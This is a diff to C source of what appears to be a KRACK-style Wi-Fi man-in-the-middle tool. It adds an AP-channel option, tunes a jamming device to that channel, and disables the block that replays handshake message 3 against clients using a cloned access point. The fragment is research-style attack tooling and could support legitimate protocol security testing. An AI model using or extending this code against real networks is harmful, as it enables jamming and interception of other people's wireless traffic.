@@ -131,6 +131,9 @@ struct options_t
 
 	/** channel of the cloned AP */
 	int clonechan;
+
+	/** Channel of AP */
+	int ap_channel;
 	
 	/** when true assume both clients are MitM'ed and attack both */
 	bool simul;
@@ -400,7 +403,7 @@ bool parseConsoleArgs(int argc, char *argv[])
 	memset(&opt, 0, sizeof(opt));
 	opt.chopint = 100; // inject 10 packets each second
 
-	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:thvKFS", long_options, &option_index)) != -1)
+	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:n:thvKFS", long_options, &option_index)) != -1)
 	{
 		switch (c)
 		{
@@ -475,6 +478,9 @@ bool parseConsoleArgs(int argc, char *argv[])
 
 		case 'S':
 			opt.simul = true;
+			break;
+		case 'n':
+			opt.ap_channel = atoi(optarg);
 			break;
 
 		default:
@@ -1097,18 +1103,19 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 	if (detect_mic_failure(buf, *plen, dbgout))
 		return 0;
 */
+#if 0
 	if (client && memcmp(hdr->addr1, client->mac, 6) == 0)
 	{
 		// TODO Do this in a KrackState method
 		if (client->krackstate->num_coll_pkts >= DATA_FRAMES_COLLECTION_LIMIT)
 		{
-			printf("reval = %d\n", client->krackstate->replay_msg3(clone));
+			printf("replay msg3 rval = %d\n", client->krackstate->replay_msg3(clone));
 		}
 		int rval = client->krackstate->handle_packet(buf, *plen);
 		return rval;
 	}
-
-	return *plen;
+#endif
+	return 1; //*plen;
 }
 
 
@@ -1924,8 +1931,10 @@ int main(int argc, char *argv[])
 	}
 #else
 	// hardcoded for testing purposes
-	osal_wi_setchannel(&ap, 1);
+	osal_wi_setchannel(&ap, opt.ap_channel);
 	osal_wi_setchannel(&clone, 12);
+	if (global.jam)
+		osal_wi_setchannel(global.jam, opt.ap_channel);
 
 	// Note: opt.clonechan is based on channel of clone device if not specified by user
 #endif
@@ -1936,6 +1945,8 @@ int main(int argc, char *argv[])
 
 	osal_wi_close(&ap);
 	osal_wi_close(&clone);
+	if (global.jam)
+		osal_wi_close(global.jam);
 	return 0;
 }
 
